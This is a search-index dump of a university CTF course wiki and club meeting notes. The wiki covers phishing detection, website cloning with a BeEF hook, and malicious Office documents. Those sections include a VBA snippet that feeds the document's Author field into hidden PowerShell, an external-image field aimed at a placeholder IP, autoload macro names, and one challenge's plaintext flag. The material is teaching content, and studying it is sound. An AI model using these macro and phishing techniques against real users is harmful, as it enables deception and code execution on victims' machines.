desk. [plug in...] OMG my mouse is out of control! usb.pcapng Hint1: packet is a USB capture, used for Logitech Optical Mouse. Hint2: IRP ID is the only part changes in capture, which represents the mouse move. Hint3: Gnuplot is an application to simulate mouse clicks. Hint4: the first word in flag is \"tHE\".","title":"(2 pt) Free USB"},{"location":"CS315/Week%209/","text":"Week9 MISC: Social Engineering Clone a Website For a phishing assessment sometimes it might be useful to completely clone a website . Note that you can add also some payloads to the cloned website like a BeEF hook to \"control\" the tab of the user. There are different tools you can use for this purpose: wget wget -mk -nH goclone #https://github.com/imthaghost/goclone oclone <url> Social Engineering Toolit #https://github.com/trustedsec/social-engineer-toolkit Detecting Phising Introduction In order to detect a phishing attempt it's important to understand the phishing techniques that are being used nowadays . In the parent page of this post you can find this information, so if you aren't aware of which techniques are being used today I recommend you to go to the parent page and read at least that section. This post is based in the idea that the attackers will try to somehow mimic or used the victim's domain name . If your domain is called example.com and you receive a phishing that is using a completely different domain name for some reason like youwonthelottery.com , this techniques aren't going to uncover it. Domain name variations It's kind of easy to uncover those phishing attempts that will use a similar domain name inside the email. It's enough to generate a list of the most probable phishing names that an attacker may use and check if it's registered or just check if there is any IP using it. Finding suspicions domains For this purpose you can use any of the following tools. Note that these tolls will also perform DNS requests automatically to check if the domain has any IP assigned to it: * dnstwist * urlcrazy **** Bitflipping In the world of computing, everything is stored in bits (zeros and ones) in memory behind the scenes. This applies to domains too. For example, windows.com becomes 01110111... in the volatile memory of your computing device. However, what if one of these bits got automatically flipped due to a solar flare, cosmic rays, or a hardware error? That is one of the 0's becomes a 1 and vice versa. Applying this concept to DNS request, it's possible that the domain requested that arrives to the DNS server isn't the same as the domain initially requested. For example a 1 bit modification in the domain microsoft.com can transform it into windnws.com. Attackers may register as many bit-flipping domains as possible related to the victim in order to redirect legitimate users to their infrastructure . For more information read https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/ All possible bit-flipping domain names should be also monitored. Basic checks Once you have a list of potential suspicions domain names you should check them (mainly the ports HTTP and HTTPS) to see if they are using some login form similar to someone of the victim's domain. You could also check the port 3333 to see if it's open and running an instance of gophish . It's also interesting to know how old each discovered suspicions domain is , the younger it's the riskier it is. You can also get screenshots of the HTTP and/or HTTPS suspicious web page to see if it's really suspicious and in that case access it to take a deeper look . Advanced checks If you want to go one step further I would recommend you to monitor those suspicious domains and search for more once in a while (every day? it only takes a few seconds/minutes). You should also check the open ports of the related IPs and search for instances of gophish or similar tools (yes, attackers also make mistakes) and monitor the HTTP and HTTPS web pages of the suspicions domains and subdomains to see if they have copied any login form from the victims web pages. In order to automate this I would recommend to to have a list of login forms of the victims domains, spider the suspicions web pages and compare each login form found inside the suspicions domains with each login form of the victim's domain using something like ssdeep . If you have located the login forms of the suspicions domains you can try to send junk credentials and check if it's redirecting you to the victims domain . Domain names using keywords The parent page also mentions a domain name variation technique that consist on putting the victim's domain name inside a bigger domain (e.g. paypal-financial.com for paypal.com). Certificate Transparency It's not possible to take the previous \"Brute-Force\" approach but it's actually possible to uncover this phishing attempts also thanks to certificate transparency. Every time a certificate is emitted by a CA, the details are made public. This means that reading the certificate transparency or even monitoring it, it's possible to find domains that are using a keyword inside it's name For example, if attackers generates a certificate of https://paypal-financial.com , seeing the certificate it's possible to find the keyword \"paypal\" and know that that suspicions email is being used. The post https://0xpatrik.com/phishing-domains/ suggest that you can use Censys to search for certificates affecting a specific keyword and filter by date (only \"new\" certificates) and by the CA issuer \"Let's Encrypt\": However, you can do \"the same\" using the free web crt.sh . You can search for the keyword and the filter the results by date and CA if you whish. Using this last option you can even use the field Matching Identities to see if any identity from the real domain matches any of the suspicious domain (note that a suspicious domain can be a false positive). Another alternative is the fantastic project called CertStream . CertStream provides a real-time stream of newly generated certificates which you can use to detect specified keywords in (near) real-time. In fact, there is a project called phishing_catcher that does just like that. New domains One last alternative is to gather a list of newly registered domains for some TLDs ( Whoxy provides such service) and check the keywords in these domains . However, long domains usually uses one or more subdomains, therefore the keyword won't appear inside the FLD and you won't be able to find the phishing subdomain. Phishing Documents Microsoft Word performs file data validation prior to opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened. Usually Word files containing macros uses the .docm extension. However, it's possible to rename the file changing the file extension and still keep their macro executing capabilities. For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution. The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.). You can use the following command to check which extensions are going to be executed by some Office programs: assoc | findstr /i \"word excel powerp\" DOCX files referencing a remote template (File \u2013Options \u2013Add-ins \u2013Manage: Templates \u2013Go) that includes macros can \u201cexecute\u201d macros as well. Word with external image Go to: Insert --> Quick Parts --> Field Categories* : Links and References, Filed names* : includePicture, and Filename or URL* :* http://%3Cip%3E/whatever Macros Code Dim author As String author = oWB.BuiltinDocumentProperties(\"Author\") With objWshell1.Exec(\"powershell.exe -nop -Windowsstyle hidden -Command-\") .StdIn.WriteLine author .StdIn.WriteBlackLines 1 Autoload functions The more common they are, the more probable the AV will detect it. AutoOpen() Document_Open() Malicious Macros Generators MacOS macphish Mythic Macro Generator Exercise (4 pt) Sanity Check Got some reviews that our challenges are so hard. Frank becomes so sad because there's no difficult challenges this week. We even have a sanity check for the first challenge. flag{1_l0v3_54n17y_ch3ck_ch4ll5} Hint1: the flag is in question description. Hint2: the flag is in plain text. (4 pt) VidCap Found this pcap of my ex's network traffic. I knew they're streaming video but I can't extract it. Can you help me ? Hint1: this challenge is from COMPFEST 13. Hint2: successfully extract files in the zip leads to the checkpoint. video.zip (2 pt) Archaeology Windows XP is a great OS. When cleaning my Windows XP laptop, something unfortunate happened... Hint1: after you found the docx, use XOR brute. This isn't a macro forensics. Archaeology.zip from MEGA Archaeology.zip from Baidu Disk with password l720","title":"Week9 MISC: Social Engineering"},{"location":"CS315/Week%209/#week9-misc-social-engineering","text":"","title":"Week9 MISC: Social Engineering"},{"location":"CS315/Week%209/#clone-a-website","text":"For a phishing assessment sometimes it might be useful to completely clone a website . Note that you can add also some payloads to the cloned website like a BeEF hook to \"control\" the tab of the user. There are different tools you can use for this purpose:","title":"Clone a Website"},{"location":"CS315/Week%209/#wget","text":"wget -mk -nH","title":"wget"},{"location":"CS315/Week%209/#goclone","text":"#https://github.com/imthaghost/goclone oclone <url>","title":"goclone"},{"location":"CS315/Week%209/#social-engineering-toolit","text":"#https://github.com/trustedsec/social-engineer-toolkit","title":"Social Engineering Toolit"},{"location":"CS315/Week%209/#detecting-phising","text":"","title":"Detecting Phising"},{"location":"CS315/Week%209/#introduction","text":"In order to detect a phishing attempt it's important to understand the phishing techniques that are being used nowadays . In the parent page of this post you can find this information, so if you aren't aware of which techniques are being used today I recommend you to go to the parent page and read at least that section. This post is based in the idea that the attackers will try to somehow mimic or used the victim's domain name . If your domain is called example.com and you receive a phishing that is using a completely different domain name for some reason like youwonthelottery.com , this techniques aren't going to uncover it.","title":"Introduction"},{"location":"CS315/Week%209/#domain-name-variations","text":"It's kind of easy to uncover those phishing attempts that will use a similar domain name inside the email. It's enough to generate a list of the most probable phishing names that an attacker may use and check if it's registered or just check if there is any IP using it.","title":"Domain name variations"},{"location":"CS315/Week%209/#finding-suspicions-domains","text":"For this purpose you can use any of the following tools. Note that these tolls will also perform DNS requests automatically to check if the domain has any IP assigned to it: * dnstwist * urlcrazy ****","title":"Finding suspicions domains"},{"location":"CS315/Week%209/#bitflipping","text":"In the world of computing, everything is stored in bits (zeros and ones) in memory behind the scenes. This applies to domains too. For example, windows.com becomes 01110111... in the volatile memory of your computing device. However, what if one of these bits got automatically flipped due to a solar flare, cosmic rays, or a hardware error? That is one of the 0's becomes a 1 and vice versa. Applying this concept to DNS request, it's possible that the domain requested that arrives to the DNS server isn't the same as the domain initially requested. For example a 1 bit modification in the domain microsoft.com can transform it into windnws.com. Attackers may register as many bit-flipping domains as possible related to the victim in order to redirect legitimate users to their infrastructure . For more information read https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/ All possible bit-flipping domain names should be also monitored.","title":"Bitflipping"},{"location":"CS315/Week%209/#basic-checks","text":"Once you have a list of potential suspicions domain names you should check them (mainly the ports HTTP and HTTPS) to see if they are using some login form similar to someone of the victim's domain. You could also check the port 3333 to see if it's open and running an instance of gophish . It's also interesting to know how old each discovered suspicions domain is , the younger it's the riskier it is. You can also get screenshots of the HTTP and/or HTTPS suspicious web page to see if it's really suspicious and in that case access it to take a deeper look .","title":"Basic checks"},{"location":"CS315/Week%209/#advanced-checks","text":"If you want to go one step further I would recommend you to monitor those suspicious domains and search for more once in a while (every day? it only takes a few seconds/minutes). You should also check the open ports of the related IPs and search for instances of gophish or similar tools (yes, attackers also make mistakes) and monitor the HTTP and HTTPS web pages of the suspicions domains and subdomains to see if they have copied any login form from the victims web pages. In order to automate this I would recommend to to have a list of login forms of the victims domains, spider the suspicions web pages and compare each login form found inside the suspicions domains with each login form of the victim's domain using something like ssdeep . If you have located the login forms of the suspicions domains you can try to send junk credentials and check if it's redirecting you to the victims domain .","title":"Advanced checks"},{"location":"CS315/Week%209/#domain-names-using-keywords","text":"The parent page also mentions a domain name variation technique that consist on putting the victim's domain name inside a bigger domain (e.g. paypal-financial.com for paypal.com).","title":"Domain names using keywords"},{"location":"CS315/Week%209/#certificate-transparency","text":"It's not possible to take the previous \"Brute-Force\" approach but it's actually possible to uncover this phishing attempts also thanks to certificate transparency. Every time a certificate is emitted by a CA, the details are made public. This means that reading the certificate transparency or even monitoring it, it's possible to find domains that are using a keyword inside it's name For example, if attackers generates a certificate of https://paypal-financial.com , seeing the certificate it's possible to find the keyword \"paypal\" and know that that suspicions email is being used. The post https://0xpatrik.com/phishing-domains/ suggest that you can use Censys to search for certificates affecting a specific keyword and filter by date (only \"new\" certificates) and by the CA issuer \"Let's Encrypt\": However, you can do \"the same\" using the free web crt.sh . You can search for the keyword and the filter the results by date and CA if you whish. Using this last option you can even use the field Matching Identities to see if any identity from the real domain matches any of the suspicious domain (note that a suspicious domain can be a false positive). Another alternative is the fantastic project called CertStream . CertStream provides a real-time stream of newly generated certificates which you can use to detect specified keywords in (near) real-time. In fact, there is a project called phishing_catcher that does just like that.","title":"Certificate Transparency"},{"location":"CS315/Week%209/#new-domains","text":"One last alternative is to gather a list of newly registered domains for some TLDs ( Whoxy provides such service) and check the keywords in these domains . However, long domains usually uses one or more subdomains, therefore the keyword won't appear inside the FLD and you won't be able to find the phishing subdomain.","title":"New domains"},{"location":"CS315/Week%209/#phishing-documents","text":"Microsoft Word performs file data validation prior to opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened. Usually Word files containing macros uses the .docm extension. However, it's possible to rename the file changing the file extension and still keep their macro executing capabilities. For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution. The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.). You can use the following command to check which extensions are going to be executed by some Office programs: assoc | findstr /i \"word excel powerp\" DOCX files referencing a remote template (File \u2013Options \u2013Add-ins \u2013Manage: Templates \u2013Go) that includes macros can \u201cexecute\u201d macros as well.","title":"Phishing Documents"},{"location":"CS315/Week%209/#word-with-external-image","text":"Go to: Insert --> Quick Parts --> Field Categories* : Links and References, Filed names* : includePicture, and Filename or URL* :* http://%3Cip%3E/whatever","title":"Word with external image"},{"location":"CS315/Week%209/#macros-code","text":"Dim author As String author = oWB.BuiltinDocumentProperties(\"Author\") With objWshell1.Exec(\"powershell.exe -nop -Windowsstyle hidden -Command-\") .StdIn.WriteLine author .StdIn.WriteBlackLines 1","title":"Macros Code"},{"location":"CS315/Week%209/#autoload-functions","text":"The more common they are, the more probable the AV will detect it. AutoOpen() Document_Open()","title":"Autoload functions"},{"location":"CS315/Week%209/#malicious-macros-generators","text":"","title":"Malicious Macros Generators"},{"location":"CS315/Week%209/#macos","text":"macphish Mythic Macro Generator","title":"MacOS"},{"location":"CS315/Week%209/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%209/#4-pt-sanity-check","text":"Got some reviews that our challenges are so hard. Frank becomes so sad because there's no difficult challenges this week. We even have a sanity check for the first challenge. flag{1_l0v3_54n17y_ch3ck_ch4ll5} Hint1: the flag is in question description. Hint2: the flag is in plain text.","title":"(4 pt) Sanity Check"},{"location":"CS315/Week%209/#4-pt-vidcap","text":"Found this pcap of my ex's network traffic. I knew they're streaming video but I can't extract it. Can you help me ? Hint1: this challenge is from COMPFEST 13. Hint2: successfully extract files in the zip leads to the checkpoint. video.zip","title":"(4 pt) VidCap"},{"location":"CS315/Week%209/#2-pt-archaeology","text":"Windows XP is a great OS. When cleaning my Windows XP laptop, something unfortunate happened... Hint1: after you found the docx, use XOR brute. This isn't a macro forensics. Archaeology.zip from MEGA Archaeology.zip from Baidu Disk with password l720","title":"(2 pt) Archaeology"},{"location":"CS315/file/chall8/","text":"\u7981\u6b62\u5185\u5377 \u8be5\u653e\u9898\u65f6\u81ea\u4f1a\u653e\u9898 \u63d0\u524d\u505a\u9898\u4f53\u9a8c\u6781\u5dee \u505a\u5b8c\u53d1\u7fa4\u66f4\u662f\u4e00\u7edd \u62d2\u7edd\u7126\u8651\u4ece\u6211\u505a\u8d77","title":"\u7981\u6b62\u5185\u5377"},{"location":"CS315/file/chall8/#_1","text":"\u8be5\u653e\u9898\u65f6\u81ea\u4f1a\u653e\u9898 \u63d0\u524d\u505a\u9898\u4f53\u9a8c\u6781\u5dee \u505a\u5b8c\u53d1\u7fa4\u66f4\u662f\u4e00\u7edd \u62d2\u7edd\u7126\u8651\u4ece\u6211\u505a\u8d77","title":"\u7981\u6b62\u5185\u5377"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-17/","text":"CTF Week Meeting 2022-02-17 How to improve my skills/techniques? Wiki/Blog collection. Competitions. Improvement About our mission this semester: self-improvement and advanced skills learning. A. material learning and reading. B. challenge/competition solving. C. vulnerability dig and website/open-source pen-testing. D. sharing. It's highly encouraged to share your blog/wirteups with us. Talking with each other in the group is also a good method to get improved. Don't be shy. Don't be afraid to talk with \"dalao\". In fact, all of us are grown from newbies. And in fact, none of us is satisfied with our current knowledge. Collection I've encountered some difficulties these days. It's hard to find new contents to learn about. I need your help. The goal of having more collections about the wiki/forum/blog is to fully access the CTF and hacking. We are going to design a book about CTF. The contributions would help us: A. design this book. B. handle a daily sharing bot/wechat channel. Everything you find may help above can send to me. Competition TQLCTF\u9ad8\u6821\u8d5b https://datacon.qianxin.com/competitions/21/introduction TQLCTF\u9ad8\u6821\u6311\u6218\u8d5b\u7531\u6e05\u534e\u5927\u5b66\uff08\u7f51\u7edc\u7814\u7a76\u9662\uff09\u5947\u5b89\u4fe1\u96c6\u56e2\u7f51\u7edc\u5b89\u5168\u8054\u5408\u7814\u7a76\u4e2d\u5fc3\u4e3b\u529e\uff0c\u7531\u6e05\u534e\u5927\u5b66Redbud\u6218\u961f\u53ca\u5947\u5b89\u4fe1\u6280\u672f\u7814\u7a76\u9662\u8054\u5408\u547d\u9898\uff0c\u672c\u6b21\u7ade\u8d5b\u65e8\u5728\u63d0\u9ad8\u9ad8\u6821\u5728\u6821\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\uff0c\u4e3a\u7f51\u7edc\u5b89\u5168\u9009\u62d4\u4f18\u79c0\u4eba\u624d\u3002\u5168\u56fd\u9ad8\u6821\u5728\u6821\u751f\u5747\u53ef\u62a5\u540d\u53c2\u52a0\u6bcf\u961f\u62a5\u540d\u4eba\u6570\u4e0d\u5f97\u8d85\u8fc710\u4eba\u3002 \u6b64\u6b21\u7ade\u8d5b\u51a0\u4e9a\u5b63\u519b\u961f\u4f0d\u5c06\u76f4\u63a5\u664b\u7ea7TQLCTF\u4eac\u6d25\u5180\u7ebf\u4e0b\u6311\u6218\u8d5b\uff0c\u4f53\u9a8c\u5168\u65b0AWD\u7ade\u8d5b\u6a21\u5f0f\u4ee5\u53ca\u6c89\u6d78\u5f0fCTF\u7ade\u8d5b\u89c6\u89c9\u76db\u5bb4\uff01 \u65f6\u95f4\uff1a2022-02-19 09:00-2022-02-20 21:00 \u4e3b\u529e\u65b9\uff1a\u6e05\u534e\u5927\u5b66(\u7f51\u7edc\u7814\u7a76\u9662)\uff0c\u5947\u5b89\u4fe1\u96c6\u56e2\u5b89\u5168\u8054\u5408\u7814\u7a76\u4e2d\u5fc3 VU CYBERTHON 2022 https://2022.cyberthon.lt/event_starts Participants will get access to the cyber security tournament system and they will have 24 hours to solve CTF challenges. \u661f\u671f\u4e94, 18 \u4e8c\u6708 2022, 01:00 CST \u2014 \u661f\u671f\u516d, 19 \u4e8c\u6708 2022, 01:00 CST Event organizers VU Cyberthon Note [x] SRC\u5e73\u53f0\u4f3c\u4e4e\u9650\u5236\u4e86\u6821\u5185\u8bbf\u95ee\uff1f [ ] \u5bfb\u627e\u5916\u90e8\u7684\u534f\u52a9\u4e0e\u5927\u4f6c\u3002 [ ] \u8bfe\u672c\u9009\u62e9\u4e00\u4e9b\u7ecf\u5178\u7684\u9898\u76ee\u4f5c\u4e3a\u5c55\u793a\u3002 [ ] \u8bfe\u672c\u9879\u76ee\u7684\uff08\u4f1a\u8bae\uff09\u5e73\u53f0\u4e0e\u9879\u76ee\u652f\u6301\u3002 [ ] wiki\u7684\u7ef4\u62a4\uff1a\u4e0b\u5468\u516d\uff0824-26\u8fd4\u6821\uff09\u3002","title":"CTF Week Meeting 2022-02-17"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-17/#ctf-week-meeting-2022-02-17","text":"How to improve my skills/techniques? Wiki/Blog collection. Competitions.","title":"CTF Week Meeting 2022-02-17"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-17/#improvement","text":"About our mission this semester: self-improvement and advanced skills learning. A. material learning and reading. B. challenge/competition solving. C. vulnerability dig and website/open-source pen-testing. D. sharing. It's highly encouraged to share your blog/wirteups with us. Talking with each other in the group is also a good method to get improved. Don't be shy. Don't be afraid to talk with \"dalao\". In fact, all of us are grown from newbies. And in fact, none of us is satisfied with our current knowledge.","title":"Improvement"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-17/#collection","text":"I've encountered some difficulties these days. It's hard to find new contents to learn about. I need your help. The goal of having more collections about the wiki/forum/blog is to fully access the CTF and hacking. We are going to design a book about CTF. The contributions would help us: A. design this book. B. handle a daily sharing bot/wechat channel. Everything you find may help above can send to me.","title":"Collection"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-17/#competition","text":"TQLCTF\u9ad8\u6821\u8d5b https://datacon.qianxin.com/competitions/21/introduction TQLCTF\u9ad8\u6821\u6311\u6218\u8d5b\u7531\u6e05\u534e\u5927\u5b66\uff08\u7f51\u7edc\u7814\u7a76\u9662\uff09\u5947\u5b89\u4fe1\u96c6\u56e2\u7f51\u7edc\u5b89\u5168\u8054\u5408\u7814\u7a76\u4e2d\u5fc3\u4e3b\u529e\uff0c\u7531\u6e05\u534e\u5927\u5b66Redbud\u6218\u961f\u53ca\u5947\u5b89\u4fe1\u6280\u672f\u7814\u7a76\u9662\u8054\u5408\u547d\u9898\uff0c\u672c\u6b21\u7ade\u8d5b\u65e8\u5728\u63d0\u9ad8\u9ad8\u6821\u5728\u6821\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\uff0c\u4e3a\u7f51\u7edc\u5b89\u5168\u9009\u62d4\u4f18\u79c0\u4eba\u624d\u3002\u5168\u56fd\u9ad8\u6821\u5728\u6821\u751f\u5747\u53ef\u62a5\u540d\u53c2\u52a0\u6bcf\u961f\u62a5\u540d\u4eba\u6570\u4e0d\u5f97\u8d85\u8fc710\u4eba\u3002 \u6b64\u6b21\u7ade\u8d5b\u51a0\u4e9a\u5b63\u519b\u961f\u4f0d\u5c06\u76f4\u63a5\u664b\u7ea7TQLCTF\u4eac\u6d25\u5180\u7ebf\u4e0b\u6311\u6218\u8d5b\uff0c\u4f53\u9a8c\u5168\u65b0AWD\u7ade\u8d5b\u6a21\u5f0f\u4ee5\u53ca\u6c89\u6d78\u5f0fCTF\u7ade\u8d5b\u89c6\u89c9\u76db\u5bb4\uff01 \u65f6\u95f4\uff1a2022-02-19 09:00-2022-02-20 21:00 \u4e3b\u529e\u65b9\uff1a\u6e05\u534e\u5927\u5b66(\u7f51\u7edc\u7814\u7a76\u9662)\uff0c\u5947\u5b89\u4fe1\u96c6\u56e2\u5b89\u5168\u8054\u5408\u7814\u7a76\u4e2d\u5fc3 VU CYBERTHON 2022 https://2022.cyberthon.lt/event_starts Participants will get access to the cyber security tournament system and they will have 24 hours to solve CTF challenges. \u661f\u671f\u4e94, 18 \u4e8c\u6708 2022, 01:00 CST \u2014 \u661f\u671f\u516d, 19 \u4e8c\u6708 2022, 01:00 CST Event organizers VU Cyberthon","title":"Competition"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-17/#note","text":"[x] SRC\u5e73\u53f0\u4f3c\u4e4e\u9650\u5236\u4e86\u6821\u5185\u8bbf\u95ee\uff1f [ ] \u5bfb\u627e\u5916\u90e8\u7684\u534f\u52a9\u4e0e\u5927\u4f6c\u3002 [ ] \u8bfe\u672c\u9009\u62e9\u4e00\u4e9b\u7ecf\u5178\u7684\u9898\u76ee\u4f5c\u4e3a\u5c55\u793a\u3002 [ ] \u8bfe\u672c\u9879\u76ee\u7684\uff08\u4f1a\u8bae\uff09\u5e73\u53f0\u4e0e\u9879\u76ee\u652f\u6301\u3002 [ ] wiki\u7684\u7ef4\u62a4\uff1a\u4e0b\u5468\u516d\uff0824-26\u8fd4\u6821\uff09\u3002","title":"Note"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/","text":"CTF Week Meeting 2022-02-24 Review of the last week. Recent competitions: VU CTF 2022 & TQL CTF 2022. First offline activity for this semester. Competitions this weekend. Review of the last week XSRC Platform https://xsrc.its.sustech.edu.cn/ Not working properly now. Having asked the developers from ITS. They have given instructive advice: Use email then. itsserver#sustech.edu.cn Wiki/Blog Collection https://github.com/tanjiti/sec_profile A repo about security profile. Gonna use information from this list first. All the blog and personal websites would be added soon. Project: TG Sec Bot The project information and the initial proposal would be posted on GitHub and invite you (if interested). Improvement Working on the security analysis and CVE post. Found several vulnerabilities from ThinkPHP and its plugins. sqlmap analysis shows it's not vulnerable. Doing some SCA recently. Communication I have emailed several top teams and waiting for their response. The experience from top teams is really important. Besides, not only for CTF, but also for security developers and engineers. Nu1L GML-SEC AAA \u96f7\u795e\u4f17\u6d4b \u5e73\u5b89\u94f6\u6cb3\u5b9e\u9a8c\u5ba4 Competition Rank VU CTF 2022 Rank 78 As an exercise competition got in the top 100. TQL CTF 2022 Rank 37 Doesn't have enough participants. Maybe better. First Offline Activity Our first offline competition activity would be held this Saturday. According to the recently COVID-19, shall the offline activity move to online? If offline: I'm going to order the meeting room 515 Southern Tower, Engineering Department. Welcome to participate. If online: we would have an online meeting for competition and sharing this Saturday, which lasts 4 hours. The sharing would be given by myself this week. I'd like to talk about the Rust programming language. If you want to share anything else, it's highly recommended to give a talk this weekend. Competitions Codegate CTF 2022 Preliminary \u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 18:00 CST \u2014 \u661f\u671f\u65e5, 27 \u4e8c\u6708 2022, 18:00 CST http://www.codegate.org/ We are going to participate in the General team. The top 9 teams from the General group would be allowed to the final competition. The maximum team size is 4 members Ugra CTF Quals 2022 (Optional) \u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 15:00 CST \u2014 \u661f\u671f\u4e8c, 01 \u4e09\u6708 2022, 15:00 CST https://2022.ugractf.ru/ The event would be in Russia. Maybe we need to use some translation tools. SUSCTF 2022 (Optional) \u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 09:00 CST \u2014 \u661f\u671f\u4e00, 28 \u4e8c\u6708 2022, 09:00 CST https://susctf2022.xctf.org.cn/ By SUSr. The name is very likely SUSTC. So, maybe you are interested. Note [ ] \u9898\u76ee\u5e73\u53f0\u73af\u5883\u6302\u4e86\uff0c\u8003\u8651\u7ef4\u62a4\u548cdocker-compose A. \u670d\u52a1\u5668\u73af\u5883\u81ea\u52a8\u542f\u52a8 B. SaaS\u7528\u6237\u542f\u52a8\u65b9\u6848 [ ] CTF Book\u52a8\u6001\u66f4\u65b0\uff0c\u6574\u7406\u7ae0\u8282\u76ee\u5f55\u548c\u6750\u6599 [ ] \u8ddf\u8fdbBlack Hat Submission\u7684\u4fe1\u606f","title":"CTF Week Meeting 2022-02-24"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#ctf-week-meeting-2022-02-24","text":"Review of the last week. Recent competitions: VU CTF 2022 & TQL CTF 2022. First offline activity for this semester. Competitions this weekend.","title":"CTF Week Meeting 2022-02-24"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#review-of-the-last-week","text":"","title":"Review of the last week"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#xsrc-platform","text":"https://xsrc.its.sustech.edu.cn/ Not working properly now. Having asked the developers from ITS. They have given instructive advice: Use email then. itsserver#sustech.edu.cn","title":"XSRC Platform"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#wikiblog-collection","text":"https://github.com/tanjiti/sec_profile A repo about security profile. Gonna use information from this list first. All the blog and personal websites would be added soon. Project: TG Sec Bot The project information and the initial proposal would be posted on GitHub and invite you (if interested).","title":"Wiki/Blog Collection"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#improvement","text":"Working on the security analysis and CVE post. Found several vulnerabilities from ThinkPHP and its plugins. sqlmap analysis shows it's not vulnerable. Doing some SCA recently.","title":"Improvement"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#communication","text":"I have emailed several top teams and waiting for their response. The experience from top teams is really important. Besides, not only for CTF, but also for security developers and engineers. Nu1L GML-SEC AAA \u96f7\u795e\u4f17\u6d4b \u5e73\u5b89\u94f6\u6cb3\u5b9e\u9a8c\u5ba4","title":"Communication"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#competition-rank","text":"","title":"Competition Rank"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#vu-ctf-2022","text":"Rank 78 As an exercise competition got in the top 100.","title":"VU CTF 2022"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#tql-ctf-2022","text":"Rank 37 Doesn't have enough participants. Maybe better.","title":"TQL CTF 2022"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#first-offline-activity","text":"Our first offline competition activity would be held this Saturday. According to the recently COVID-19, shall the offline activity move to online? If offline: I'm going to order the meeting room 515 Southern Tower, Engineering Department. Welcome to participate. If online: we would have an online meeting for competition and sharing this Saturday, which lasts 4 hours. The sharing would be given by myself this week. I'd like to talk about the Rust programming language. If you want to share anything else, it's highly recommended to give a talk this weekend.","title":"First Offline Activity"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#competitions","text":"","title":"Competitions"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#codegate-ctf-2022-preliminary","text":"\u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 18:00 CST \u2014 \u661f\u671f\u65e5, 27 \u4e8c\u6708 2022, 18:00 CST http://www.codegate.org/ We are going to participate in the General team. The top 9 teams from the General group would be allowed to the final competition. The maximum team size is 4 members","title":"Codegate CTF 2022 Preliminary"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#ugra-ctf-quals-2022-optional","text":"\u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 15:00 CST \u2014 \u661f\u671f\u4e8c, 01 \u4e09\u6708 2022, 15:00 CST https://2022.ugractf.ru/ The event would be in Russia. Maybe we need to use some translation tools.","title":"Ugra CTF Quals 2022 (Optional)"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#susctf-2022-optional","text":"\u661f\u671f\u516d, 26 \u4e8c\u6708 2022, 09:00 CST \u2014 \u661f\u671f\u4e00, 28 \u4e8c\u6708 2022, 09:00 CST https://susctf2022.xctf.org.cn/ By SUSr. The name is very likely SUSTC. So, maybe you are interested.","title":"SUSCTF 2022 (Optional)"},{"location":"Meeting/CTF%20Week%20Meeting%202022-02-24/#note","text":"[ ] \u9898\u76ee\u5e73\u53f0\u73af\u5883\u6302\u4e86\uff0c\u8003\u8651\u7ef4\u62a4\u548cdocker-compose A. \u670d\u52a1\u5668\u73af\u5883\u81ea\u52a8\u542f\u52a8 B. SaaS\u7528\u6237\u542f\u52a8\u65b9\u6848 [ ] CTF Book\u52a8\u6001\u66f4\u65b0\uff0c\u6574\u7406\u7ae0\u8282\u76ee\u5f55\u548c\u6750\u6599 [ ] \u8ddf\u8fdbBlack Hat Submission\u7684\u4fe1\u606f","title":"Note"},{"location":"Meeting/CTF%20Week%20Meeting%202022-03-03/","text":"CTF Week Meeting 2022-03-03 Review of the recent competitions. COMPASS CTF platform has moved back to VPS. Wiki page update and maintenance. Competition of the weekend. Competition Review CODEGATE 2022 We have achieved rank 29. The rank is in the top tier 2 list. The top 20 teams are very famous organizers , r3kpig , DiceGang , Oops , and perfect blue . Our rank is along with Super Guesser . In the meanwhile, we have won Redbud for continuous 3 times. Still, we have some areas to improve. First of all, all of our scores are from the Web category. PWN is still an area we should improve. The Rev and Crypto of the codegate are very difficult. CTFshow Congratulations to Frankss! Looking forward to your next rank 1 in CTF! CTF Platform In the past very long time, we use CTFd online collocation system to deploy our platform. The CTFd online service is limited now. The black box of CTFd doesn't offer us direct interaction with the source code and the plugins. In order to make further improvements, we are going to switch back to the local VPS deployment. We have 2 plans: A. use my personal VPS server. The VPS is in Hong Kong with 8 CPU 